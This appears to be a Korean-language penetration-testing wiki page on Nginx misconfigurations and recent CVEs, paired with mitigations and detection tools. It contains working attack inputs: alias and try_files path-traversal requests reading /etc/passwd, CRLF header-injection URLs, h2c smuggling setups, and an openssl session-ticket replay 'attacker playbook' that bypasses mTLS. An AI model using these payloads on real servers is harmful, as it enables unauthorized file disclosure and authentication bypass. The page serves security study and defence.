# Nginx

{{#include ../../banners/hacktricks-training.md}}


## 루트 위치 누락 <a href="#missing-root-location" id="missing-root-location"></a>

Nginx 서버를 구성할 때, **root directive**는 파일이 제공되는 기본 디렉터리를 정의하는 중요한 역할을 합니다. 아래 예제를 보세요:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
이 구성에서는 `/etc/nginx`가 root 디렉터리로 지정되어 있습니다. 이 설정은 `/hello.txt` 같은 지정된 root 디렉터리 내의 파일들에 접근할 수 있게 해줍니다. 다만 오직 특정 위치(`/hello.txt`)만 정의되어 있고, root 위치(`location / {...}`)에 대한 설정은 없습니다. 이 누락으로 인해 root directive가 전역적으로 적용되어 `/` 루트 경로에 대한 요청이 `/etc/nginx` 하위의 파일들에 접근할 수 있게 됩니다.

이 구성으로 인해 중요한 보안 문제가 발생합니다. `GET /nginx.conf` 같은 단순한 `GET` 요청으로 `/etc/nginx/nginx.conf`에 있는 Nginx 설정 파일이 노출될 수 있습니다. root를 `/etc`처럼 덜 민감한 디렉터리로 설정하면 이 위험을 완화할 수 있지만, 다른 설정 파일들, 액세스 로그, 심지어 HTTP basic authentication에 사용되는 암호화된 자격증명 등 다른 중요한 파일들에 대한 의도치 않은 접근이 여전히 가능할 수 있습니다.

## Alias LFI 구성 오류 <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

Nginx의 구성 파일에서는 "location" 지시자를 면밀히 검사할 필요가 있습니다. Local File Inclusion (LFI)로 알려진 취약점은 다음과 유사한 구성으로 인해 의도치 않게 도입될 수 있습니다:
```
location /imgs {
alias /path/images/;
}
```
이 설정은 서버가 `/imgs../flag.txt` 같은 요청을 의도된 디렉터리 외부의 파일에 접근하려는 시도로 해석하여 실제로 `/path/images/../flag.txt`로 해석되기 때문에 LFI 공격에 취약합니다. 이 결함으로 인해 공격자는 웹을 통해 접근할 수 없어야 할 서버의 파일 시스템에서 파일을 가져올 수 있습니다.

이 취약점을 완화하려면 구성은 다음과 같이 조정해야 합니다:
```
location /imgs/ {
alias /path/images/;
}
```
추가 정보: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix 테스트:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## 안전하지 않은 경로 제한 <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

다음 페이지를 확인하여 다음과 같은 지시문을 우회하는 방법을 알아보세요:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## 안전하지 않은 변수 사용 / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> 취약한 변수 `$uri` 및 `$document_ur`i 이며, 이는 `$request_uri`로 교체하여 수정할 수 있습니다.
>
> 정규식도 다음과 같이 취약할 수 있습니다:
>
> `location ~ /docs/([^/])? { … $1 … }` - 취약
>
> `location ~ /docs/([^/\s])? { … $1 … }` - 취약하지 않음 (공백 검사)
>
> `location ~ /docs/(.*)? { … $1 … }` - 취약하지 않음

다음 예시는 Nginx 구성에서의 취약점을 보여줍니다:
```
location / {
return 302 https://example.com$uri;
}
```
문자 \r (Carriage Return) 및 \n (Line Feed)는 HTTP 요청에서 개행 문자를 나타내며, 그 URL-encoded 형태는 `%0d%0a`로 표현됩니다. 이러한 문자를 요청(예: `http://localhost/%0d%0aDetectify:%20clrf`)에 포함해 잘못 구성된 서버로 보내면 서버는 `Detectify`라는 새 헤더를 생성합니다. 이는 $uri 변수가 URL-encoded 개행 문자를 디코드하기 때문에 발생하며, 그 결과 응답에 예기치 않은 헤더가 포함됩니다:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
CRLF injection 및 response splitting의 위험에 대해 자세히 알아보려면 [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

또한 이 기술은 [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77)에서 몇 가지 취약한 예제와 탐지 메커니즘과 함께 설명되어 있습니다. 예를 들어, blackbox 관점에서 이 잘못된 구성을 탐지하려면 다음 요청들을 보낼 수 있습니다:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

취약한 경우, 첫 번째는 "X"가 임의의 HTTP method이기 때문에 응답을 반환하고, 두 번째는 H가 유효한 메서드가 아니므로 오류를 반환합니다. 따라서 서버는 `GET / H HTTP/1.1` 같은 요청을 받게 되고 이는 오류를 유발합니다.

다른 탐지 예시는 다음과 같습니다:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

해당 발표에서 제시된 일부 취약한 구성은 다음과 같았습니다:

- Note how **`$uri`** is set as is in the final URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- 다시 한번 **`$uri`**가 URL에 있는 것을 주목하세요 (이번에는 파라미터 안에 있습니다)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- 이제 AWS S3에서
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### 임의의 변수

특정 상황에서 **사용자 제공 데이터**가 **Nginx 변수**로 처리될 수 있음이 발견되었다. 이러한 동작의 원인은 다소 불명확하지만, 드물지 않으며 확인하기도 간단하지 않다. 이 이상현상은 HackerOne의 보안 보고서에서 지적되었으며, 해당 보고서는 [here](https://hackerone.com/reports/370094)에서 볼 수 있다. 에러 메시지를 추가로 조사한 결과, 이 문제가 [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365)에서 발생함을 확인했고, Server Side Includes (SSI)가 근본 원인으로 지목되었다.

이 **잘못된 구성**을 감지하려면, 다음 명령을 실행해 Referer 헤더를 설정하고 변수가 출력되는지 테스트할 수 있다:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
시스템 전반에 걸친 이 구성 오류에 대한 스캔에서는 사용자가 Nginx 변수를 출력할 수 있는 여러 사례가 발견되었습니다. 그러나 취약한 인스턴스 수의 감소는 이 문제를 패치하려는 노력이 어느 정도 성공했음을 시사합니다.

### try_files와 $URI$ARGS 변수 사용

다음과 같은 Nginx 구성 오류는 LFI 취약점으로 이어질 수 있습니다:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
우리 설정에서는 지정된 순서로 파일의 존재 여부를 확인하는 데 사용되는 `try_files` 지시어가 있습니다. Nginx는 찾은 첫 번째 파일을 제공한다. `try_files` 지시어의 기본 구문은 다음과 같습니다:
```
try_files file1 file2 ... fileN fallback;
```
Nginx는 지정된 순서대로 각 파일의 존재 여부를 확인합니다. 파일이 존재하면 즉시 제공됩니다. 지정된 파일이 하나도 존재하지 않으면 요청은 다른 URI나 특정 에러 페이지일 수 있는 폴백 옵션으로 전달됩니다.

하지만 이 디렉티브에서 `$uri$args` 변수를 사용할 경우, Nginx는 요청 URI에 query string 인수를 결합한 것과 일치하는 파일을 찾으려고 시도합니다. 따라서 우리는 이 구성을 악용할 수 있습니다:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
다음 payload로:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
우리의 페이로드를 사용하면 루트 디렉터리(Nginx 구성에 정의된)를 벗어나 `/etc/passwd` 파일을 로드할 수 있습니다. 디버그 로그에서 Nginx가 파일을 시도하는 방식을 관찰할 수 있습니다:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC againts Nginx using the configuration mentioned above:
![Example burp request](../../images/nginx_try_files.png)

## 원시 백엔드 응답 읽기

Nginx는 `proxy_pass`를 통해 백엔드에서 생성된 오류와 HTTP 헤더를 가로채 내부 오류 메시지와 헤더를 숨기도록 하는 기능을 제공합니다. 이는 Nginx가 백엔드 오류에 대해 사용자 정의 오류 페이지를 제공함으로써 이루어집니다. 그러나 Nginx가 잘못된 HTTP 요청을 만났을 때 문제가 발생합니다. 그러한 요청은 수신된 그대로 백엔드로 전달되며, 백엔드의 원시 응답이 Nginx의 개입 없이 클라이언트로 직접 전송됩니다.

uWSGI 애플리케이션이 관련된 예시 시나리오를 고려해보십시오:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
이를 관리하기 위해 Nginx 구성에서는 특정 디렉티브들이 사용됩니다:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): 이 지시자는 백엔드 응답의 상태 코드가 300보다 큰 경우 Nginx가 커스텀 응답을 제공하도록 합니다. 예제의 uWSGI 애플리케이션에서 `500 Error` 응답이 가로채져 Nginx에 의해 처리되도록 보장합니다.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): 이름 그대로, 이 지시자는 클라이언트에 대해 지정된 HTTP 헤더를 숨겨 프라이버시와 보안을 향상시킵니다.

유효한 `GET` 요청이 들어오면 Nginx는 정상적으로 처리하여 비밀 헤더를 노출하지 않는 표준 오류 응답을 반환합니다. 그러나 잘못된 HTTP 요청은 이 메커니즘을 우회하여 비밀 헤더와 오류 메시지를 포함한 원시 백엔드 응답이 노출되게 합니다.

## merge_slashes set to off

기본적으로 Nginx의 **`merge_slashes` directive**는 **`on`**으로 설정되어 여러 개의 슬래시를 단일 슬래시로 압축합니다. 이 기능은 URL 처리를 간소화하지만, 특히 local file inclusion (LFI) 취약점에 취약한 애플리케이션 뒤에서 동작할 때 의도치 않게 취약점을 숨길 수 있습니다. 보안 전문가인 **Danny Robinson and Rotem Bar**는 특히 Nginx가 reverse-proxy로 동작할 때 이 기본 동작과 관련된 잠재적 위험을 지적했습니다.

이러한 위험을 완화하려면 취약점에 노출되기 쉬운 애플리케이션에 대해 **`merge_slashes` directive를 off로 설정**하는 것이 권장됩니다. 이렇게 하면 Nginx가 URL 구조를 변경하지 않고 애플리케이션으로 요청을 전달하므로 기본적인 보안 문제를 숨기지 않습니다.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

As shown in [**this writeup**](https://mizu.re/post/cors-playground), 특정 헤더가 웹 서버 응답에 포함되면 Nginx 프록시의 동작을 변경합니다. 관련 내용은 [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/)에서 확인할 수 있습니다:

- `X-Accel-Redirect`: 지정된 위치로 요청을 내부적으로 리다이렉트하도록 Nginx에 지시합니다.
- `X-Accel-Buffering`: Nginx가 응답을 버퍼링할지 여부를 제어합니다.
- `X-Accel-Charset`: X-Accel-Redirect를 사용할 때 응답의 문자 집합을 설정합니다.
- `X-Accel-Expires`: X-Accel-Redirect를 사용할 때 응답의 만료 시간을 설정합니다.
- `X-Accel-Limit-Rate`: X-Accel-Redirect를 사용할 때 응답 전송 속도를 제한합니다.

예를 들어 헤더 **`X-Accel-Redirect`**는 nginx에서 내부적인 **redirect**를 발생시킵니다. 따라서 **`root /`** 같은 nginx 설정과 웹 서버의 응답에 **`X-Accel-Redirect: .env`**가 포함되어 있으면 nginx는 **`/.env`**의 내용을 전송하게 되어 Path Traversal이 발생합니다.

### **Default Value in Map Directive**

In the **Nginx configuration**, the `map` directive often plays a role in **authorization control**. A common mistake is not specifying a **default** value, which could lead to unauthorized access. For instance:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
`default`이 없으면, **악의적인 사용자**가 `/map-poc` 내의 **정의되지 않은 URI**에 접근하여 보안을 우회할 수 있습니다. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html)에서는 이러한 문제를 피하기 위해 **기본값**을 설정할 것을 권고합니다.

### **DNS Spoofing Vulnerability**

DNS spoofing은 특정 조건에서 Nginx에 대해 가능할 수 있습니다. 공격자가 Nginx가 사용하는 DNS 서버를 알고 DNS 쿼리를 가로챌 수 있다면, DNS 레코드를 spoof할 수 있습니다. 그러나 이 방법은 Nginx가 DNS 해석에 localhost (127.0.0.1)을 사용하도록 설정된 경우에는 효과가 없습니다. Nginx는 다음과 같이 DNS 서버를 지정할 수 있습니다:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` and `internal` Directives**

**`proxy_pass`** 지시어는 요청을 내부 또는 외부의 다른 서버로 리디렉션하는 데 사용됩니다. **`internal`** 지시어는 특정 위치가 Nginx 내부에서만 접근 가능하도록 보장합니다. 이러한 지시어 자체가 취약점은 아니지만, 보안 상의 문제를 방지하기 위해 설정을 신중하게 검토해야 합니다.

## proxy_set_header Upgrade & Connection

nginx 서버가 Upgrade 및 Connection 헤더를 전달하도록 구성되어 있다면, [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md)를 수행하여 보호된/내부 엔드포인트에 접근할 수 있습니다.

> [!CAUTION]
> 이 취약점은 공격자가 **`proxy_pass` endpoint와 직접 연결을 수립`**(`http://backend:9999` 이 경우)하여 해당 콘텐츠가 nginx에 의해 검사되지 않도록 만들 수 있습니다.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> `proxy_pass`가 `http://backend:9999/socket.io` 같은 특정 **path**를 가리키고 있더라도 연결은 `http://backend:9999`로 설정되므로 내부 엔드포인트의 다른 경로에 **접근할 수 있습니다. 따라서 proxy_pass URL에 경로가 지정되어 있어도 상관없습니다.**

## HTTP/3 QUIC 모듈 원격 DoS & leak (2024)

2024년 동안 Nginx는 CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 및 CVE-2024-35200을 공개했으며, 이는 실험적 `ngx_http_v3_module`가 컴파일되어 있고 `listen ... quic` 소켓이 노출된 경우 단일 악의적인 QUIC 세션으로 worker 프로세스가 충돌하거나 메모리 leak가 발생할 수 있음을 보여줍니다. 영향을 받는 빌드는 1.25.0–1.25.5 및 1.26.0이며, 1.27.0/1.26.1이 수정사항을 포함합니다; 메모리 공개(CVE-2024-34161)는 민감한 데이터가 노출되려면 추가로 MTU가 4096바이트보다 커야 합니다(자세한 내용은 아래의 2024 nginx 권고문 참조).

**Recon & exploitation hints**

- HTTP/3는 opt-in이므로 `Alt-Svc: h3=":443"` 응답을 스캔하거나 UDP/443에 대한 QUIC 핸드셰이크를 무차별 시도하세요; 확인되면 핸드셰이크와 STREAM 프레임을 custom `quiche-client`/`nghttp3` payloads로 fuzz하여 worker 충돌을 유발하고 로그 leak를 강제하세요.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## TLS session resumption bypass of client cert auth (CVE-2025-23419)

2025년 2월 권고에 따르면 OpenSSL로 빌드된 nginx 1.11.4–1.27.3는 한 이름 기반 가상 호스트에서 **TLS 1.3 세션 재사용**을 통해 다른 호스트 내부에서 세션을 재사용할 수 있게 허용합니다. 따라서 인증서 없는 호스트와 협상한 클라이언트는 ticket/PSK를 재생하여 `ssl_verify_client on;`로 보호된 vhost로 이동해 mTLS를 완전히 우회할 수 있습니다. 이 버그는 여러 가상 호스트가 동일한 TLS 1.3 세션 캐시와 티켓을 공유할 때마다 발생합니다(아래 참조된 2025 nginx 권고문 참고).

**공격자 플레이북**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
대상이 취약하면, 두 번째 핸드셰이크가 클라이언트 인증서를 제시하지 않은 채 완료되어 보호된 위치가 노출됩니다.

**검토 항목**

- `server_name` 블록이 `ssl_session_cache shared:SSL`과 `ssl_session_tickets on;`을 함께 공유하는 혼합 구성.
- mTLS를 기대하지만 공개 호스트로부터 공유 세션 캐시/티켓 설정을 상속받는 Admin/API 블록.
- vhost 격리를 고려하지 않고 TLS 1.3 세션 재개를 전역적으로 활성화하는 자동화(예: Ansible roles).

## HTTP/2 Rapid Reset 대응 (CVE-2023-44487 동작)

The HTTP/2 Rapid Reset attack (CVE-2023-44487)은 운영자가 `keepalive_requests` 또는 `http2_max_concurrent_streams`를 기본값보다 높게 설정할 경우 여전히 nginx에 영향을 줍니다: 공격자는 하나의 HTTP/2 연결을 열고 수천 개의 스트림으로 채운 다음 즉시 `RST_STREAM` 프레임을 발행하여 동시성 한도에 도달하지 않게 만들면서도 종료 처리 로직에서 CPU가 계속 소모되게 만듭니다. Nginx 기본값(128 동시 스트림, 1000 keepalive 요청)은 영향 범위를 작게 유지합니다; 이러한 한도를 "상당히" 높이면 단일 클라이언트만으로도 워커를 고갈시키는 것이 매우 쉬워집니다(아래 참조된 F5 분석 참조).

**탐지 팁**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
해당 지시문들에 대해 비정상적으로 높은 값을 노출하는 호스트는 주요 표적이다: 하나의 HTTP/2 클라이언트가 stream 생성과 즉시 `RST_STREAM` 프레임을 반복해 CPU를 고갈시키면서도 concurrency cap을 발동시키지 않을 수 있다.

## 직접 시도해보기

Detectify는 이 글에서 다룬 일부 misconfigurations를 포함하는 취약한 Nginx 테스트 서버를 Docker로 설정해 직접 찾아볼 수 있는 GitHub 리포지토리를 만들었다!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## 정적 분석 도구

### [GIXY](https://github.com/yandex/gixy)

Gixy는 Nginx 구성을 분석하는 도구다. Gixy의 주요 목적은 보안 misconfiguration을 예방하고 결함 탐지를 자동화하는 것이다.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner는 일반적인 Nginx misconfigurations와 취약점을 찾기 위한 간단한 도구다.

## 참고자료

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
